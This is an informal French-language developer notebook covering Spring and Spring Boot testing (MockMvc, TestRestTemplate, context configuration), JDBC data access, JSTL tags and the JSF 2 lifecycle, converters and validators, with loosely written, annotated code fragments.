                                    import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
                                                      
                                    @RunWith(SpringRunner.class) ou (SpringJUnit4ClassRunner.class)  ou (JMock.class)   si on veut tester non pas une seule classe mais une classe appelant une autre (qui est mockee) // grace à @RunWith(SpringJUnit4ClassRunner.class) ça initialise la classe SpringJUnit4ClassRunner avant de demarrer les tests. Cette classe permet d'injecter des beans dans cette classe //INDISPENSABLE POUR QUE @TESTPROPERTYSOURCE MARCHE
                                    puis
                                    @SpringBootTest(webEnvironment=RANDOM_PORT//facultatif. Si c'est du springboot. Du coup c'est pour les tests d'integration. Pas pour les tests unitaires. On peut aussi forcer le port) si spring-boot: demarre carrement le serveur. // recherche la classe annotee @SpringBootApplication pour def ApplicationContext qui est partage entre toutes les methodes et classes de test sauf si on met @DirtiesContext
                                     ou
                                    @WebMvcTest(MaClasseControllerAvecAnnotationArobaseController_QueJeVeuxTester.class)// facultatif. que pour springboot. Si je ne met pas ca il wire tout. Là il wire Tout aussi mais que le @Controller spécifié. A l'inverse de @SpringBootTest ne demarre pas SpringBoot. Nous permet d'utiliser LINKmockmvc dans cette classe de test
                                    puis
                                    @ContextHierarchy({ // facultatif. permet de definir une hierarchie de contexts: d'abord parent puis fils
                                    @ContextConfiguration(locations={"pathVersFichierXml/spring-dsTest-anot.xml","classpath:...","classpath:..."}) ou (classes={uneClasseAnnoteeConfigurationOuAutre.class}) Si on ne met rien il va chercher dans "classpath:/pathVersResources/NomClasseDeTest-context.xml// U que pour tests.// POUR CHARGER UNE CONF DANS LES TESTS. fonctionne de paire avec @TESTPROPERTYSOURCE. Apparemment inutile de mettre cette anotation si j'ai mis @WebMvcTest qui wire tout par défaut donc charge toutes les @Configuration
                                    @ContextConfiguration({"file:src/main/webapp/WEB-INF/DoncAPartirDeLaRacineDuProjetapplicationContext.xml","file:src/test/resource/oracle-config-test.xml"})
                                                          locations=est facultatif  /cheminabsolu/fichier.xml ou cheminrelatif/fichier.xml cherche dans le classpath c a d :src/main/resources et src/main/java 
                                                          loader=AnnotationConfigContextLoader.class // Indispensable? si dans notre classe de test on a une classe statique de configuration à l'interieur.
                                                          initializers={ClasseInitializerFacultativeQuiSertAJeNeSaisPasQuoi.class}
                               ,@ContextConfiguration("fils.xml")}) // fin contextHierarchy . SI a l'initialisation spring des tests il ne trouve pas mon fichier xml: c parce qu'il est pas compile dans le classpath test-classpath: voir proprietes projet>java buildpath > s'assurer que les resources des tests sont compilees en sortie dans le path test-classes                         
                                    @WebAppConfiguration // dispo a partir de spring3.2:charge tous les urls des Controllers doit être utilise avec @ContextConfiguration. Utilise pour indiquer que l'ApplicationContext doit être un WebApplicationContext. Il a besoin d'une librairie de serveur tel tomcat dans le pom en scope test
                                      public class MaClassDeTest {
                                          @Configuration
                                          static class MaConfig{  
                                          @Bean...etc 
                                    @TestPropertySource(value={"classpath:/config/test.properties,classpath:/app.test.properties","classpath:/database.test.properties"}) // pour que les tests utilisent un autre fichier de propriete // VA REMPLIR VARIABLE ENVIRONNEMENT${xx}dans les configs.xml ET LES ANNOTATIONS @VALUE // voir http://docs.spring.io/spring/docs/4.3.2.RELEASE/javadoc-api/org/springframework/test/context/TestPropertySource.html
                                                    ou  locations=                                                                                 
                                       
                                    DEPRECIE : 
                                    // ne pas mettre @TransactionConfiguration et @Transaction si nos tests appellent des services car ceux ci gèrent dejà les transactions
                                    @TransactionConfiguration(transactionManager="ideaTxManager",defaultRollback=false) // pour que la classe de teste puisse tester directement les dao sans passer par le service.: le service cree automatiquement les transactions mais pas le test donc besoin mettre ca. Ainsi la classe test se comporte comme un service qui appelle les dao
                                                                                                 defaultRollback=true permet de resetter la db après les tests
                                    FINDEPRECIE: utiliser au niveau des methodes du test : tests : @Rollback ou @Commit                                                                                                 

                                    public class TestDintegrationWebService
                                    {
                                    pour acceder au contexte dans le test:
                                      @Autowired ou @Inject ou @Resource
>>>                                   WebApplicationContext wac;   // attention c le top mais pour l'utiliser dans ma classe je dois charger la configuration avec @ContextConfiguration le fichier xml qui est : chercher "WEB-INF/applicationcontext.xml (fichier spring) (c'est le front controller)" et je dois aussi utiliser @WebAppConfiguration  sinon j'aurais je crois si j'ai No qualifying bean of type [org.springframework.web.context.WebApplicationContext] 
                                      ou 
                                      @Autowired ou @Inject
                                      ApplicationContext context; 
                                      
                                      @Autowired
                                      MockServletContext servletContext;
                                      @Autowired
                                      MockHttpSession session; // session.setAttribute("x","val");
                                      @Autowired
                                      MockHttpServletRequest request; //request.setParameter("x","val");
                                      @Autowired
                                      MockHttpServletResponse response;
                                      @Autowired
                                      ServletWebRequest webRequest; 
                                      @Autowired  
                                     TestRestTemplate rest = testRestTemplate;  // tester un webservice
                                      
                                      
                                      @Autowired ou @Inject
                                      IPermissionDao permissiondao;
                                      
                                      @Autowired
>>>                                   private MockMvc mockMvc; //LINKmockmvc
                                      
                                      Mockery context = new JUnit4Mockery(); // pour utiliser Jmock (voir plus bas)<  
                                      
                                      //spring-batch-tester
                                        @Autowired
                                        private JobLauncherTestUtils jobLuncherTestUtils; // pour spring-batch
                                      @BeforeClass // on peut y recuperer un bean
                                      public static void initJndi() throws Exception {
                                            ApplicationContext applicationContext = new ClassPathXmlApplicationContext("jndi.xml");
                                            SimpleNamingContextBuilder builder = new SimpleNamingContextBuilder();
                                            builder.bind("java:comp/env/jdbc/foo", applicationContext.getBean("dataSource"));
                                            builder.activate();
                                        }
                                      @Before
                                      public void setup()
                                      {
                                            MockitoAnnotations.initMocks(this);
>>>                                         this.mockMvc=MockMvcBuilders.webApplicationContextSetupOuwebAppContextSetup(this.wac).addFilter(this.springSecurityFilterChain).build();
                                            ou
                                            this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build(); // inutile si LINKmockmvc ?
                                            ou
>>>                                         this.mockMvc= MockMvcBuilders.standaloneSetup(wac ou context ou new MonControllerAtester())
                                            .addFilter(this.unFiltreSpring)// je peux ajouter des filtres spring (pas ceux du web.xml mais que ceux de spring)
                                            .build();
                                            expect(mockMvc.uneMethode()).andReturn(retourQuelleDevraEnvoyer).anyTimes(); // je prepare mon mockito : qu'est ce que ses methodes devront renvoyer qd on les appelle
                                  
                                            session = (IHRSession) wac.getBean("openhr.session"); // recuperer la session 
                                               user = (HRUserImpl) session.connectUser("HRFR", "HR");
			   
                                      }
                                      @Test
                                      @Transactional // possible
                                      public void searchSendRequest()
                                      {
                                      
                                      //si dans mes controlleurs j'ai besoin que l'utilisateur soit authentifie : simuler qu'il est authentifie:
                                          		  GrantedAuthority role = new SimpleGrantedAuthority("AUTH");
                                          		  List<GrantedAuthority> roles = new ArrayList<GrantedAuthority>();
                                          		  UserDetails userDetail = new User("nom", "password", roles);
                                          		  UsernamePasswordAuthenticationToken authenticationQuiEstUnPrincipal = new UsernamePasswordAuthenticationToken(userDetail,userDetail.getPassword(),userDetail.getAuthorities());
                                          		  SecurityContextHolder.getContext().setAuthentication(authenticationQuiEstUnPrincipal); 
                                      //FIN si dans mes controlleurs j'ai besoin que l'utilisateur soit authentifie : simuler qu'il est authentifie:
                                                                            
                                      String request = new Scanner(new ClassPathResource("json/request.json").getFile()).useDelimiter("\\Z").next(); //voir regexp LINKçeeçeeçregexpçeeçeeç
                                      executer un controlleur :
                                      	this.mockMvc.perform(get("/show")) //necessite import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
                                  			  .andExpect(status().isOk()) // necessite import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
                                  			  .andExpect(content().contentType("application/json"))
                                  			  .andExpect(jsonPath("$.name").value("Lee"));
                                  		tester la reponse d'un webservice rest	  
                                  		  ResponseEntity<MmcUser> response = testRestTemplate.getForEntity("/admin/getUsers", MmcUser.class);
                                        Assertions.assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK); // assertJ est integré directement dans springboot
                                  		ou
>>>                                 MvcResult result =mockMvc.perform(post("/sirh/user")
                                                    		.header("Api-key", apiKey)
                                                    		.accept(MediaType.APPLICATION_JSON_UTF8_VALUE)
                                                    		.contentType(MediaType.APPLICATION_JSON) ou contentType(MediaType.TEXT_HTML)
                                                    		.with(user("toto").roles("TATA"))
                                                    		.param("jsonobj","{\"destination\":\"yaounde\",\"departure\":\"douala\",\"timedeparture\":\"3\",\"daydeparture\":\"01/01/2016\"}")
                                                    		.content(request)) // requete envoyee si c'est du POST(je crois) ne s'applique pas pour du GET    
                                                    		.andExpect(content().contentType("application/json;charset=UTF-8")) //tests retours
                                                            .andExpect(jsonPath("nom").value("toto")); // pour verifier que le contenu renvoyé contient ce json. De org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath
                                                    		ou
                                                        .andExpect(status().isForbidden());                
                                                    		.andDo(print())
                                                    		.andReturn();  
                                                        String content = result.getResponse() //ou getRequest() ou getModelAndView()
                                                                               .getContentAsString();
                                                        org.junit.Assert.assertNotNull(content);
                                         
                                        monService = context.mock(InterfaceDeMonService.class) // pour utiliser jmock
                                        permissiondao.insert(permission4);
                                    		assertTrue(permissiondao.getAll().size()==4);
                                    		permissiondao.delete(permission4);
                                        voir page 129, 120, 131 de Spring Persistance With Hibernate
                                        
                                        ou tester un upload de fichier
                                            		  MockMultipartFile fichier = new MockMultipartFile("file", fis); // pas reussi à afaire marcher ci-dessous peux pas definir le contenttype
                                                	//MockMultipartFile fichier = new MockMultipartFile("nomfichier.xls","nomfichierOriginal.xls","application/octet-stream", fis);
                                                  //MockMultipartFile fichier = new MockMultipartFile("a","a.xls",null,fis);
                                                  //MockHttpServletRequestBuilder content = MockMvcRequestBuilders.post("/save",fichier).param("type", "test").param("autrechamp", "valeur");
                                                  MockHttpServletRequestBuilder content = MockMvcRequestBuilders.fileUpload("/save").file(fichier).param("type", "ZY5N").param("mode","simulation");
                                             		  this.mockMvc.perform(content)
                                              		  .andExpect(status().isOk());
                                          
                                        ou bien tester un webservice  
                                        TestRestTemplate rest = new RestTemplate();  
                                         @Test
                                          public void availableTest() {
                                              MockRestServiceServer mockServer=MockRestServiceServer.createServer(rest);
                                              mockServer.expect(requestTo("/available")).andRespond(withSuccess("bla","text/plain"));
                                              mockServer.verify();
                                        ou bien tester un webservice Avant  
                                        @Autowired
                                        private TestRestTemplate rest;  
                                         @Test
                                          public void availableTest() {
                                              String resp = rest.getForObject("/available", String.class);
                                              assertThat(resp).isEqualTo("Spring in Action");
                                    
                                    	@After
                                    	@Transactional // possible
                                    	public void reinitDb()
                                    	{
                                    	}
                                    	@AfterClass
                                    	public static void reinit()
                                    	{
                                    	}
                                    }


                                    
                              
                  
              JDBC : pour recuperer le dernier Id insere : 
                                    SqlUpdSqlUpdate insert = new SqlUpdate(datasource, "INSERT INTO departure (agency, place) VALUES (?,?)");
                              insert.declareParameter(new SqlParameter(Types.INTEGER));
                              insert.declareParameter(new SqlParameter(Types.INTEGER));
                              insert.setReturnGeneratedKeys(true);
                      // assuming auto-generated col is named 'id'
                              insert.setGeneratedKeysColumnNames(new String[] {"id"});
                              insert.compile();
                                GeneratedKeyHolder keyHolder = new GeneratedKeyHolder();
                              insert.update(new Object[]{departure.getAgencyId(),1}, keyHolder);
                              System.out.println(keyHolder.getKey().longValue());
                            int last=  keyHolder.getKey().intValue();
                              return last;
        utilisation de springframework.jdbc pour requetter en sql:
                                                public interface IdepartureDao {
                                                    void deleteData(int id);
                                                    List<Departure> getDepartureList(int i);
                                                    Departure getDeparture(String id);
                                                    void updateAllDepartures(List<Departure> departures);
                                                    int insertData(Departure newdeparture);
                                                }

                              public class DepartureDao implements IdepartureDao { 
                                          departureList = jdbcTemplate.query(sql, new DepartureResultSetExtractor());
                                          private static class DepartureResultSetExtractor implements ResultSetExtractor<List<Departure>>
                                              {
                                                  @Override
                                                  public List<Departure> extractData(ResultSet rs) throws SQLException, DataAccessException
                                                  {
                                                      Map<Integer,Departure> departures = new HashMap<Integer,Departure>();
                                                      DepartureExtractor de = new DepartureExtractor();
                                                      DaysOfWeekExtractor dw = new DaysOfWeekExtractor();
                                                      TransitExtractor te = new TransitExtractor();
                                                      PriceExtractor pr = new PriceExtractor();
                                          
                                                      while(rs.next()) {
                                                          Integer departureId = rs.getInt(1);
                                                          Departure departure =de.extractData(rs);
                                                          if (departures.get(departureId)== null) {
                                                              departures.put(departureId,departure);
                                                          }
                                                          DayOfWeek dayWeek =dw.extractData(rs);
                                                          if (dayWeek.getId()!=0 && !departures.get(departureId).getDayOfWeeks().contains(dayWeek))
                                                          {
                                                              departures.get(departureId).getDayOfWeeks().add(dayWeek);
                                                              departures.get(departureId).getMapDayOfWeeks().put(String.valueOf(dayWeek.getId()),true);
                                                          }
                                                          ...
                                                          List<Departure> ret = new ArrayList<Departure>(departures.values());
                                                      return ret;
                                                  }
                                                  
                                                  public static class DepartureExtractor implements ResultSetExtractor<Departure> {
                                                      PlaceExtractor pe = new PlaceExtractor();
                                                      public Departure extractData(ResultSet resultSet) throws SQLException,DataAccessException
                                                      {
                                                          Departure departure = new Departure();
                                                          departure.setId(resultSet.getInt("departure.id"));
                                              ...
                                                          departure.setPlace(pe.extractData(resultSet));
                                                          return departure ;
                                                      }


      
jstl :(GENIAL CE TRUC POUR SPRING)
<%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%> besoin de le mettre en tete de chaque page jsp qui l'utilise
  pour faire des liens qui indique automatiquement le contexte:
      href="<c:url value="/logout"/>"
   faire des boucles loops  foreach:
      xmlns:c="http://java.sun.com/jsp/jstl/core"
      <c:forEach items="${ideaBean.columns}" var="col">
      		<tr><td>		<h:outputText value="#{col}" /></td><td>  <p:selectBooleanCheckbox value="value="#{userBean.value2}" /></td></tr>
     		</c:forEach>
  formater pattern dans les jsp: 
      <%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>
      <fmt:formatNumber value="${result.priceReduced}" type="currency"/>
test if :
<c:if test="${results.size()==0}">
<c:if test="${result.nbComments>0}">!!!!</c:if>
egalitee de string : 
    <option value="${imgoption}"<c:if test="${imgoption==departure.imageName}">selected="selected"</c:if>>${imgoption}</option>      
      
jsf2 : jsf : ---------DEBUTBEURK----------
faire des boucles loops  foreach:
     xmlns:ui="http://java.sun.com/jsf/facelets"
			         <ui:repeat value="#{licenceBean.allLicencesSelectObj}" var="item">
    						  <h:outputText value="#{item.id}" />
						</ui:repeat>
  submit soumettre formulaire avec touche entree: 
      <h:form defaultCommand="cb1"> // cb1 est l'id de mon commandButton
  un bean peut s'occuper de plusieurs pages et une page peut avoir plusieurs beans
  prependId:  (<h:form prependId="true ou false")
    =true: si existe un <ui:include src="pages/mon_sous_form.xhtml"/> dans mon formulaire, les champs qui sont dans mon_sous_form.xhtml auront le nom idFormPere:idInput
    =false:  si existe un <ui:include src="pages/mon_sous_form.xhtml"/> dans mon formulaire, les champs qui sont dans mon_sous_form.xhtml auront le nom idInput tout simplement mais là, attention aux doublons 
  si champ est un boolean
      cote bean java mettre soit getMonBool soit isMonBool c pareil    
  Arithmetic  +, -, *, / (or div), % (or mod)
  Relational    == (or eq ), != (or ne), < (or lt), > (or gt), <= (or le), >= (or ge)
  Logical && (or and), || (or or), ! (or not)
  Conditional A ? B : C (Evaluate A to Boolean. If true, evaluates and returns B. Otherwise, evaluates and returns C.)
  Empty = empty A (If A is null or is an empty string, array, Map, or Collection, returns true. Otherwise returns false.)
 
          xmlns:h="http://java.sun.com/jsf/html"
          xmlns:f="http://java.sun.com/jsf/core"
          xmlns:ui="http://java.sun.com/jsf/facelets"
          xmlns:vt="http://java.sun.com/jsf/composite/trainer"> // pour faire des composants customises. voir "comosants customises"
          <h:head> // bonne pratique
              <title>A Simple JavaServer Faces Registration Application</title>
            </h:head>
            <h:body>
    en bas de page : 
    bonne pratique : 
    <p><h:messages /></p> // comme ca ca affiche toute autre erreur
  
  une action : ne peut pas être appellee par une URL comme dans struts:
    un bouton qui envoie une request requete ajax :                                                        
        <h:inputText value="#{purchases.cheapItems[0]}"/>// ici c'est un tableau ou bien <h:inputText value='#{purchases.valuableItems["low"]}'/>       
        <h:commandButton...action="#{someBean.someMethod // ici pas de get et de set dans le nom de la methode}"/>
          <f:ajax execute="@ form" render="resultId"/> // execute prend l'id d'un objet  du dom qu'on envoie au serveur!!! et de meme pour render: il prend un id du dom
        </h:commandButton>      
        <h:outputText value="#{myBean.myProperty}" id="resultId"/>.
  pour recuperer le httprequest et ou response 
      Recuperer un param du request: toto.jsp?userId=blah
        {#param.userId} on peut le mettre partout : dans annotations java: @ManaqedProperty(value="#{param.userid}")) 
                                                                     ou dans jsf xhtml: <h:outputText value="#{param['userid']}" />or <h:outputText value="#{param.userid}" />
      ou
         ExternalContext context = FacesContext.getCurrentInstance().getExternalContext();
        HttpServletRequest request =  (HttpServletRequest)context.getRequest();
        HttpServletResponse response = (HttpServletResponse)context.getResponse();
      ou
      Map<String, Object> requestMap=FacesContext.getCurrentInstance().getExternalContext().getRequestMap();
        et on peut toujours faire requestMap.put("totoMaCle","titi ma valeur");
        puis dans jsf on peut mettre #{totoMaCle}
  CommandButton et CommandLink :Font des HTTP POST/ pour les update. Ne font pas un redirect donc pour respecter PRG besoin forcer redirect (voir face-config.xml)
        le commandbouton:
                  <p><h:commandButton value="Mon Libelle" action="monOutcome" /></p> (voir lifecycle)  
                                                          action="#{userBean.addConfirmedUser}" 
                les command buttons : voir ci-dessus. Remarque si je met attribut immediate : ca interromp le lifecycle et applique l'execution de mon bouton. Utile si je veux canceller ou faire de l'ajax-like
        le commandlink:
                <h:commandLink action="monOutcome ou "#{userBean.addConfirmedUser}">
                        <h:outputText value="libelle de mon lien"/>
                </h:commandLink>        
  Bouton et Lien simples : Font des HTTP GET donc les formulaires ne sont pas envoyes au serveur. Pour voir une autre page (sans update). Font un redirect.                                        
                h:button outcome=nomdelapagexhtmlsanspointxhtml, et h:link outcome=nomdelapagexhtmlsanspointxhtml 
  exemple lien :
        <h:link outcome="page02" value="Link with query parameters">
            <f:param name="word1" value="hello" />
            <f:param name="word2" value="dolly" />
        </h:link>
      genère:  http://localhost:8080/methodInvocation/faces/page02.xhtml?word1=hello&word2=dolly
  exemple UIOutput ou UIInput general:avec les backing beans (en opposition à ManagedBeans) (voir backingbeans)
      <h:inputText binding="leBackingBean.proprieteDuBackingBean" value="libelle"/> à la validation du form, il n'y aura pas de conversion ni de validation des params mis dans binding. Le Backing bean peut alors changer l'etat de mes champs (exemple: disabled, changer value...) sans reel traitement metier(sur?)          
  exemple boolean checkbox : 
      <h:selectBooleanCheckbox value="#{model.booleanValue}" />
        cote java c'est un setBoolean (c'est un boolean)
  si champ est un boolean
      cote bean java mettre soit getMonBool soit isMonBool c pareil
  exemple select :
      <h:selectOneRadio id="sex" value="#{userBean.sex}" required="true"/>
        <f:selectItem itemLabel="Male" itemValue="male"/>
          <f:selectItem itemLabel="Female" itemValue="female"/>
    </h:selectOneRadio>
    <h:message for="sex"/>
    ou bien 
    <h:selectOneMenu value="#{flash.monChoix}"> (mis dans memoire flash pour rappel pour la prochaine request seulement)
          <f:selectItems value="#{monBean.mesValeurs}"/> // mesValeurs est un objet de type Collection
    </h:selectOneMenu>
pour renvoyer un message de mon bean : (et i18n :) 
        doneMessage = new FacesMessage("Failed to add new user"); si "{mon.libelle.i18n"}
                      severity=INFO ou WARN ou ERROR ou FATAL
                      summary= human readable message
                      detail=  human readable message
        FacesContext.getCurrentInstance().addMessage(null, doneMessage);
          return "blah";
  pour afficher une propriete de bean de facon conditionnelle: 
        <h:outputText rendered="#{userBean.manager}" value="#{Employee.salary}"/> // rendered c la condition. si renvoie true, il affichera Employee.salary
        autre exemple: 
        <h:outputText rendered=" #{userBean.serviceLevel == 'Premium'}" value ="Felicitation tu es premium avec reduction #{Discounts.basicDiscount * 10}% discount!" />
  autre exemple condition :
      <h:panelGroup rendered="#{! empty flash.serviceLevel}"> // affiche le contenu uniquement si flash.serviceLevel est defini
        (...)
     </h:panelGroup>
executer une methode de mon bean java à la volee en lui envoyant des parametres: 
    <p>
      The text after the colon comes from the invocation of
      a method via the EL: #{maClasseBean.generateSentance(param.word1,param.word2)} // maClasseBean est annotee @ManagedBean
    </p>
composants customises :
      <html ....
        xmlns:vt="http://java.sun.com/jsf/composite/malibrairiecustomisee"> // pour faire des composants customises. voir "comosants customises" comme url start part http://java.sun.com/jsf/composite/ :traitement special: après "composite/" il doit y avoir qu'un seul mot. ici "malibrairiecustomisee"
        ...
        <body><h:form>
          <vt:loginPanel />
        </h:form></body>
        </html>     
        jsf va donc chercher malibrairiecustomisee.war qui peut contenir des fichiers.xhtml et notemment loginPanel.xhtml.
        Dans un projet maven il doit se trouver sous src/main/webapp/resources/malibrairiecustomisee/loginPanel.xhtml.
        et dans le war malibrairiecustomisee.war maven le place dans resources/malibrairiecustomisee/loginPanel.xhtml
        a faire : poursuivre au chapitre : Chapter 11 - Building Custom UI Components The Code Behind the Markup of This Simple JSF UI Component
 
lifecycle :                                                                                                                                                                                                                                                                                                                                                                                                
      Restore View (construit ou recupere le FacesContext.UIViewRoot = image de mon form cote serveur) 
      > Apply Request Values: set les values des comp UIViewRoot implementant ValueHolder. Pour chacun de ceux ci:
            si component a property immediate validator.validate(value du component) est execute là. Sinon voir plus bas. 
      > Process Validations = conversion: 
                                      balises de conveters :
                                          conversions de date par ex: et autres (0ou1 par UIOuput (UIInput extends UIOuput)       
                                                    <h:inputText label="Date of Birth" id="dob" value="#{userBean.dob}" required="true"> 
                                                              <f:convertDateTime  //dans mon bean java userBean.dob doit etre de type java.util.Date
                                                                  dateStyle="short(05/26/03) ou medium ou long(12;30;45 pm) ou full ou default" (facultatif. Par defaut c default. Si non: B remplir locale)
                                                                  locale="instance de java.util.Local ou string=premier argument de java.util.Locale(String language, String country)" facultatif Par defaut il recup FacesContext.getCurrentInstance().getViewRoot().getLocale()
                                                                  pattern="MM-dd-yy" facultatif, doit etre au format java.txt.SimpleDateFormat (ex:"HH:mm:ss on EEEE ',' MMMM dd ',' yyyy" = 13:24:21 on Tuesday, April 15, 1997)
                                                                  timeZone="" facultatif. Par defaut system timezone used. String de type timezone ID voir java.util.TimeZone
                                                                  type="date, time ou both" both par defaut(=DateTime)
                                                                  binding="**unBeanDedieADistribuerLesConverters.quiRenvoitUneInstanceDeMaClasseConverter" facultatif, EL expression renvoyant une instance de java.faces.convert.NumberConverter ou java.faces.convert.DateTimeConverter 
                                                                                                                                                                                                              ou un autre custom converter tout en java: 
                                                                                                                                                                                                                  public class MonConverter extends Object implements Converter
                                                                                                                                                                                                                  {
                                                                                                                                                                                                                    ...
                                                                                                                                                                                                                    throw new ConverterException("message");// message sera la propriete detail d'un nouveau FacesMessage instancie automatiquement dont la severity est ERROR
                                                                                                                                                                                                                    ou
                                                                                                                                                                                                                    throw new ConverterException(new FacesMessage("message"));
                                                                                                                                                                                                                  }                                                            
                                                                  />
                                                              <f:convertNumber 
                                                              currencyCode="USD ou EUR par ex" //trois lettre du code ISO4217. Peut etre une binding EL qui renvoit ce code
                                                              groupingUsed="true ou flase" // true par defaut
                                                              pattern="" // un pattern de java.util.DecimalFormat Peut etre un binding EL expression qui renvoit ce pattern. Par defaut pas de pattern utilise
                                                              type="number ou currency ou percentage" // par defaut number 
                                                              binding=(voir ci-dessus **)
                                                              />
                                                              <f:convert
                                                              converterId="" id du converter definit dans face-config.xml ou equivalent: @FaceConverter(value="cetId" (mode explicite) forClass="java.lang.Byte" (mode implicite:+rapide à l'exec)) ou  // deconseille car il y a binding. voir page 7-15 et 7-16
                                                              binding=(voir ci-dessus)
                                                              />      //P mettre f:convert sur uioutput ou uiinput (un seul par uicomponent)
                                                    </h:inputText> (mm-dd-yy) le convvertDateTame s'attend à recevoir de l'utilisateur le format mm-dd-yy pour que la conversion String->Date se fasse sinon une conversionError est affichee autom.
                                                    <h:message for="dob" />
                                          UIComponent a un Renderer? oui, le recup et en fait un converter.
                                          si non
                                          a un Converter? oui, le recup (on peut le def comme ci-dessus par les balises jsf 
                                                                              ou meme programatically en java  dans le UIViewRoot.PhaseListener abonne à l'event "beforePHase" avec ce code: voir **¤** 
                                          si non
                                          a un ValueBinding? oui, cree un converter by type
                                 avec converter:              
                                jsf  getObject---> <---getString()  server
                                Strings                              int
                                Strings                              Date
                                Strings                              Float
                                Strings                              String etc...
                                           si non, assume already converted donc String.
                               Exist ConverterException? Oui: queue Exception, add ConverterMessage pouvant etre overide par moi dans mon UIInput, dans la queue FacesMessage,  Arrete traitement pour ce UIComponent
                               si pas d'exception, continue:
                              puis JSF validation de chaque value de chaque comp.(0 à n valideur par UIInput). D'abord component marque comme invalid SAUF si property disabled (pas de validator associes dans ce cas même si il a ete defini)
                                      required et vide? oui: queue Exception, add requiredMessage pouvant etre overide par moi dans mon UIInput dans la queue FacesMessage , Arrete traitement pour ce UIComponent
                                      non
                                      continue: 
                                          exemples :
                                              meth1: permet d'associer max 1 validator/component:
                                                   côte jsf:                            
                                                           <f:validateRequired> // ** haha!!! là tous les champs entre cette balise seront nested required (ne prend pas precedence sur les balises validator inclues dans les components)
                                                             <h:inputText ou inputHidden ou inputTextarea ou selectManyListbox ou selectOneMenu ou inputSecret ou selectBooleanCheckbox ou selectManyMenu ou selectOneRadio ou selectManyCheckbox ou selectOneListbox
                                                                 label="Email Address" id="email" value="#{userBean.email}" required="true"(ici ou voir plus bas) requiredMessage="Userid is required" 
                                                                 validator(meth1)="#{userBean.validateEmail}
                                                                 ou
                                                                 validator-id="id.de.mon.validator" declare par @FacesValidator(value="id.de.mon.validator") 
                                                                                                                public class MonValidator extends Object implements Validator
                                                                                                                {
                                                                                                                      public void validate(FacesContext context, UIComponent component, Object valueConvertieDuComponent) throws ValidatorException
                                                                                                                      {
                                                                                                                        ici pour faire appel à un autre bean: voir chapitre "pour recuperer appeler un bean  ou les params d'un bean de du scope de ce bean en java" 
                                                                                                                        ...si echoue, 
                                                                                                                        FacesMessage message = new FacesMessage("Invalid email address");
                                                                                                                        throw new ValidatorException(message); // severity de FacesMessage toujours = "ERROR"
                                                                                                                        les Exceptions sont queued, les validatorMessage sont mises dans FacesContext 
                                                                                                                        Arrete traitement pour ce UIComponent                                                                                                                                                            
                                                                                   
                                                                 ">
                                                                          <f:validateRequired/> // ici ou bien même peut englober!!! voir **
                                                             </h:inputText>
                                                             autres exemples uniquement jsf: 
                                                                  DoubleRange(f:validateDoubleRange), LongRange(f:validateLongRange) exemple :
                                                                                <h:inputText value="#..." id="zip">
                                                                                  <f:validateLongRange minimum="nombreMin" maximum="nombreMax"/>
                                                                                </h:inputText>
                                                                                <h:message for="zip"/> 
                                                                  LengthValidator exemple :
                                                                                  <f:validateLength minimum="16" maximum="16"/> //16 char exactement
                                                                  RegularExpression(f:validateRegex RegexValidator) exemple :
                                                                                  <f:validateLength minimum="16" maximum="16"/> //16 char exactement
                                                                                  <f:validateRegex pattern=".*\p[Punct].*"/>
                                                                                  <f:validateRegex pattern=".*\d.*`\d.*"/>
                                                                                  <f:validateRegex pattern=".*[A-Z].*"/>
                                                            jsf avec validator customise: 
                                                                  Bean(f:validateBean) exemple:
                                                                                  <f:validateBean validationGroups="com.jsfcompref.groups.Minimal"/>
                                                                                      etc. implementent javax.faces.validator.Validator voir exemple classe validator ci-dessus
                                                            </f:validateRequired>//**
                                                              <h:message for="email" />
                                                    ou cote java: pendant le UIViewRoot.PhaseListener abonne à l'event "beforePHase" avec ce code: voir **¤**
                                                  PUIS
                                                   cote serveur dans mon userBean:
                                                        public void validateEmail(FacesContext context, UIComponent toValidate, Object value) throws ValidatorException 
                                                        {
                                                            String emailStr = (String) value;
                                                            if (-1 == emailStr.indexOf("@")) 
                                                            {
                                                                FacesMessage message = new FacesMessage("Invalid email address");
                                                                throw new ValidatorException(message); // severity de FacesMessage toujours = "ERROR"
                                                            }
                                                          }
                                        OU
                                              meth2 associe plusiers validator cote java pendant le UIViewRoot.PhaseListener abonne à l'event "beforePHase" de definir plusieurs validators aux components que je veux avec ce code: voir **¤**
                                  
                          si success component marque comme valid
                          puis si value!=exValue queue ValueChangeEvent
                          Si au moins 1 Exception, reste sur page sinon 
      > Update Model Values: mon java bean recupere les values du UIViewRoot 
      > Invoke Application: si outcome-> forward = outcome
                            si action UICommand declanche ActionEvent
                                ActionEvent contient:
                                  .id = UI component Id (bouton)
                                  .source.action=monBean.MaMethode (public et peut accepter 0 arg. Peut accepter n arg?)
                                Cet Action Event passe en param de ActionListener(ActionEvent)
                                -> forward = beanMethod executee->string result
      >NavigationHandler cherche le forward :Render response
                            si forward=null reste sur page
                            sinon
                            si forward existe dans face-config.xml->utilise. First one wins
                                                          <?xml version="1.0"?>
                                                          <faces-config … version="2.0">
                                                          <navigation-rule>
                                                            <from-view-id>/starting-page.xhtml</from-view-id> // Est facultatif. Ici on peut utiliser les wildcard: * exemple : /register/* 
                                                              <navigation-case>
                                                                    <from-action>#{MonManagedBean.maMethode}</from-action> // optionnel: si on le met pas c parce que une xhtml appelle une xhtml directement (dans ce cas on ne passe pas par une action)
                                                                    <from-outcome>siMonBeanReturnCaOuMonUILienouBouton a cette action</from-outcome> // exemple: mapage
                                                                                         ici on peut y mettre ca : <if>#{model.booleanValue}</if> MAIS C MOCHE DE METTRE DE LA LOGIQUE LA DEDANS JE NE LE FERAIS JAMAIS
                                                                    <to-view-id>/aller-vers-ca.xhtml</to-view-id>
                                                                    <redirect> // facultatif: si on met pas, l'url du browser ne change pas car le serveur renvoit sa response dans la meme http et c plus performant. Si on met: creation d'un nouveau request/response mais au moins l'url du browser change. Mais si mon bean n'est pas sessionScoped, le request/response est perdu
                                                                                // c'est equivalent à mettre ><h:commandButton value="HTTP POST with Redirect"action="page02?faces-redirect=true" /> // faces-redirect est le mot cle pour indiquer que cest un <redirect>
